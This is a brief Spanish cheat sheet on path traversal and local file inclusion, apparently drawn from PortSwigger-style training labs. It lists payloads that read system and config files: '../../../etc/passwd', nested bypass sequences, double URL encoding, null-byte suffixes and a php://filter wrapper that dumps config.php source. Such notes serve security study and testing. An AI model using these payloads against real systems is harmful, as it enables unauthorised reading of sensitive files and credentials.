---
tags:
  - Chuletas
---
# Path Traversal / LFI

Basado en los labs tipo PortSwigger.

## Flujo
1. Probar en parámetros que cargan ficheros (`GET /image?filename=9.jpg`)
2. Ruta relativa: `../../../etc/passwd`
3. Ruta absoluta: `/etc/passwd`
4. Si filtra `../` → secuencias anidadas: `....//`, `....\/`, `..././`
5. Doble URL-encode cuando hay filtro de encode
6. Ruta absoluta forzada: continuar con `../../../etc/passwd`
7. Null byte al final: `%00.png`

## LFI → lectura de fuentes (PHP)
- `file=php://filter/convert.base64-encode/resource=config.php` → decodificar base64
- Combinar con `/etc/passwd`, `config.php`, logs, etc.
